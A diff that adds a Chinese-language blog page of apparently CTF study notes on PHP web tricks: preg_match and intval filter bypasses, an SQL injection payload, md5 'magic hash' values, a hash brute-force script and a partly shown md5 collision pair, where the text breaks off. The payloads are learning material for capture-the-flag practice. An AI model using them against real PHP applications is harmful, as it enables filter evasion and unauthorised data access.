@@ -1,0 +1,897 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Englobe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PHPvar_dump( ) 以列的形式展开数据，方便查看 scandir( ) 扫描某一文件夹目录 file_get_contents( ) 读取文件，拼接用’.’ 如num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) base_convert() 函数 在任意进制之间转换数字，返回一个字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常用知识点">
+<meta property="og:url" content="http://example.com/2023/09/27/web%E5%AD%A6%E4%B9%A0/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+<meta property="og:site_name" content="Englobe blog">
+<meta property="og:description" content="PHPvar_dump( ) 以列的形式展开数据，方便查看 scandir( ) 扫描某一文件夹目录 file_get_contents( ) 读取文件，拼接用’.’ 如num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) base_convert() 函数 在任意进制之间转换数字，返回一个字符">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405132152442.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405132202676.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405132202676.png">
+<meta property="article:published_time" content="2023-09-27T13:16:34.000Z">
+<meta property="article:modified_time" content="2024-11-14T13:13:49.418Z">
+<meta property="article:author" content="Englobe">
+<meta property="article:tag" content="常用知识点">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405132152442.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>常用知识点 - Englobe blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Englobe</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="常用知识点"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-27 21:16" pubdate>
+          2023年9月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          19k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          159 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">常用知识点</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>var_dump( ) 以列的形式展开数据，方便查看</p>
+<p>scandir( ) 扫描某一文件夹目录</p>
+<p>file_get_contents( ) 读取文件，拼接用’.’ 如num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p>
+<p>base_convert() 函数 在任意进制之间转换数字，返回一个字符串</p>
+<p>dechex() 函数：把十进制转换为十六进制。</p>
+<p>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p>
+<p>readfile() 函数读取文件</p>
+<p>localeconv()函数返回一包含本地数字及货币格式信息的数组<br>配套使用<br>利用**scandir()**，传入’.’显示当前所有目录，即scandir(‘.’)</p>
+<p>但 ‘.’被不符合正则匹配的规则</p>
+<p> 然后利用**localeconv()**函数返回一包含本地数字及货币格式信息的数组（其数组的第一个值就是.）</p>
+<p>利用指针指向数组的第一个值</p>
+<p><strong><code>current()</code></strong> 函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
+<p><strong><code>pos()</code></strong> 函数返回数组中的当前元素的值。该函数是 current() 函数的别名。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
+<p><strong>scandir(localeconv(current()));</strong><br><strong><code>next()</code></strong> 函数将内部指针指向数组中的下一个元素，并输出。返回的是数组具体的值，不能嵌套。<br><strong><code>array_reverse()</code></strong> 函数返回翻转顺序的数组。</p>
+<h3 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h3><h4 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h4><p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p>
+<h4 id="2、PCRE回溯次数限制"><a href="#2、PCRE回溯次数限制" class="headerlink" title="2、PCRE回溯次数限制"></a>2、PCRE回溯次数限制</h4><p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p>
+<h4 id="3、换行符"><a href="#3、换行符" class="headerlink" title="3、换行符"></a>3、换行符</h4><p><code>.</code>不会匹配换行符，如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>只需要</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$json</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-subst">\n</span>flag&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>只需要传入</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=flag%0a<br></code></pre></td></tr></table></figure>
+
+<h3 id="intval-函数绕过"><a href="#intval-函数绕过" class="headerlink" title="intval()函数绕过"></a>intval()函数绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">intval</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span> ] )<br></code></pre></td></tr></table></figure>
+
+<p>函数作用：获取变量的整数值</p>
+<p>0x:16 0:8 0b:2 默认10</p>
+<h4 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h4><p>当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值</p>
+<p> echo intval(1e10);              &#x2F;&#x2F; 1410065408<br> echo intval(‘1e10’);            &#x2F;&#x2F; 1<br> echo intval(‘1e10’+1);          &#x2F;&#x2F; 1410065409<br>应用场景：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">intval</span>($_GET[&#x27;lover&#x27;]) &lt; <span class="hljs-number">2023</span> <span class="hljs-symbol">&amp;&amp;</span> intval($_GET[&#x27;lover&#x27;] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h4><p>当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过。</p>
+<p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p>
+<p>如果 $var 以 0 开头，就使用 8进制</p>
+<p>如果 $var 以0x开头，就使用 16进制</p>
+<p>否则，就使用 10进制</p>
+<h4 id="转换字符串特性绕过"><a href="#转换字符串特性绕过" class="headerlink" title="转换字符串特性绕过"></a>转换字符串特性绕过</h4><p>如果以数字开头，就返回1个或多个连续的数字</p>
+<p>如果以字母开头，就返回0</p>
+<p> if(intval($id) &gt; 999){<br>         # id 大于 999 直接退出并返回错误<br>         die(“id error”);<br>     }else{<br>         # id 小于 999 拼接sql语句<br>         $sql &#x3D; “select * from article where id &#x3D; $id order by id limit 1 “;<br> <!-- flag in id = 1000 --><br>payload:?id&#x3D;2 or id&#x3D;1000</p>
+<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素，有为1无为0</p>
+<p>三种数组写法：</p>
+<p> $a[]&#x3D;1;</p>
+<p> $a&#x3D;array(1,2);</p>
+<p> $a&#x3D;[1,2];<br>但在传参时一般使用第一种形式，经过测试发现，传参默认都是字符串类型，根据intval的字符串转换规则，如果字符串第一个字符不是数字就会直接返回0，所以后面两种形式都是返回0，只有第一种可以正确返回数字1</p>
+<h4 id="取反-绕过"><a href="#取反-绕过" class="headerlink" title="取反~绕过"></a>取反~绕过</h4><p>当某个数字被过滤时，可以两次取反来绕过</p>
+<p> var_dump(intval(~10));  \ -11<br> var_dump(intval(~~10)); \ 10</p>
+<h4 id="算数运算符绕过"><a href="#算数运算符绕过" class="headerlink" title="算数运算符绕过"></a>算数运算符绕过</h4><p>当某个数字被过滤时，可以使用算数运算符绕过</p>
+<p> var_dump(intval(5*5));<br> var_dump(intval(5+5));<br> var_dump(intval(05+5));<br>输出：</p>
+<p> int(25)<br> int(10)<br> int(10)</p>
+<h4 id="SQL注入intval-函数绕过黑名单方法"><a href="#SQL注入intval-函数绕过黑名单方法" class="headerlink" title="SQL注入intval()函数绕过黑名单方法"></a>SQL注入intval()函数绕过黑名单方法</h4><p> #flag in id&#x3D;1000<br> if(preg_match(“&#x2F;or|-|\|*|&lt;|&gt;|!|x|hex|+&#x2F;i”,$id)){<br>     die(“id error”);<br> }<br> if(intval($id) &gt; 999){<br>     die(“id error”);<br> }<br> else{</p>
+<pre><code class="hljs">     # id 小于 999 拼接sql语句
+</code></pre>
+<p>​         $sql &#x3D; “select * from article where id &#x3D; $id order by id limit 1 “;<br> }<br> 根据黑名单的不同，访问?id&#x3D;1000有以下几种方法:<br> ?id&#x3D;’1000’ &#x2F;&#x2F;“1000”或(1000)皆可<br> ?id&#x3D;125&lt;&lt;3 &#x2F;&#x2F;左移<br> ?id&#x3D;680|320 &#x2F;&#x2F;按位或<br> ?id&#x3D;992^8 &#x2F;&#x2F;按位异或<br> ?id&#x3D;~~1000 &#x2F;&#x2F;两次取反<br> ?id&#x3D;0x3e8 &#x2F;&#x2F;十六进制<br> ?id&#x3D;0b1111101000 &#x2F;&#x2F;二进制</p>
+<h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><h4 id="1-数组绕过"><a href="#1-数组绕过" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h4><p>由于md5不能加密数组，在加密数组的时候会返回NULL，所以我们可以传入两个数组<br>数组绕过适用于源码中没有判断变量类型或内容，如果加上了过滤函数就不能使用了</p>
+<p>常见过滤函数如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ctype_alnum</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$text</span> ) : <span class="hljs-keyword">bool</span><br><span class="hljs-comment">// 如果text中所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回FALSE </span><br><br><span class="hljs-title function_ invoke__">is_numeric</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> ) : <span class="hljs-keyword">bool</span><br><span class="hljs-comment">// 如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-科学计数法绕过"><a href="#2-科学计数法绕过" class="headerlink" title="2.科学计数法绕过"></a>2.科学计数法绕过</h4><p>可以传入两个md5加密后是0e开头的字符串，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0；可以查找以0e开头md5加密相等的字符串，也可以自己编写代码，提供以下脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$a</span>&lt;=<span class="hljs-number">1000000000</span>;<span class="hljs-variable">$a</span>++)&#123;<br>   <span class="hljs-variable">$md5</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^0e\d+$/&#x27;</span>,<span class="hljs-variable">$md5</span>))&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$md5</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs dns">byGcY<br><span class="hljs-number">0</span>e5919481469660520670<span class="hljs-number">35298880982</span><br><br>QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br><br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br><br><span class="hljs-number">240610708</span><br><span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br><br><span class="hljs-number">314282422</span><br><span class="hljs-number">0</span>e9909955048216994945<span class="hljs-number">20356953734</span><br><br><span class="hljs-number">571579406</span><br><span class="hljs-number">0</span>e972379832854295224<span class="hljs-number">118025748221</span><br><br><span class="hljs-number">903251147</span><br><span class="hljs-number">0</span>e17451050382393294<span class="hljs-number">2361353209384</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="双MD5判断"><a href="#双MD5判断" class="headerlink" title="双MD5判断"></a>双MD5判断</h3><p>有些题目，可能会经过两次MD5值的判断</p>
+<p>MD5和双MD5以后的值都是0e开头的</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">CbDLytmyGm2xQyaLNhWn</span><br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">脚本<br><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br>CHARS = string.letters + string.digits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp_md5</span>(<span class="hljs-params">substr, stop_event, str_len,. start=<span class="hljs-number">0</span>, size=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-keyword">global</span> CHARS<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        rnds = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br>        md5 = hashlib.md5(rnds)<br>        value = md5.hexdigest()<br>        <span class="hljs-keyword">if</span> value[start: start+str_len] == substr:<br>            <span class="hljs-built_in">print</span> rnds<br>            stop_event.<span class="hljs-built_in">set</span>()<br>            <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            #碰撞双md5</span><br><span class="hljs-string">            md5 = hashlib.md5(value)</span><br><span class="hljs-string">            if md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="hljs-string">                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;</span><br><span class="hljs-string">                stop_event.set()</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    substr = sys.argv[<span class="hljs-number">1</span>].strip()<br>    start_pos = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    str_len = <span class="hljs-built_in">len</span>(substr)<br>    cpus = multiprocessing.cpu_count()<br>    stop_event = multiprocessing.Event()<br>    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,<br>                                         stop_event, str_len, start_pos))<br>                 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cpus)]<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.start()<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.join()<br></code></pre></td></tr></table></figure>
+
+<h3 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h3><h4 id="1-数组绕过-1"><a href="#1-数组绕过-1" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h4><p>因为是强类型比较，用0e开头的字符串是没办法绕过的了，但是PHP自身的特性使得可以提交一个数组<br>而md5函数传入数组的返回值都是NULL，这样就可以绕过强类型比较了</p>
+<h4 id="2-使用md5加密后两个完全相等的两个字符串绕过"><a href="#2-使用md5加密后两个完全相等的两个字符串绕过" class="headerlink" title="2.使用md5加密后两个完全相等的两个字符串绕过"></a>2.使用md5加密后两个完全相等的两个字符串绕过</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span 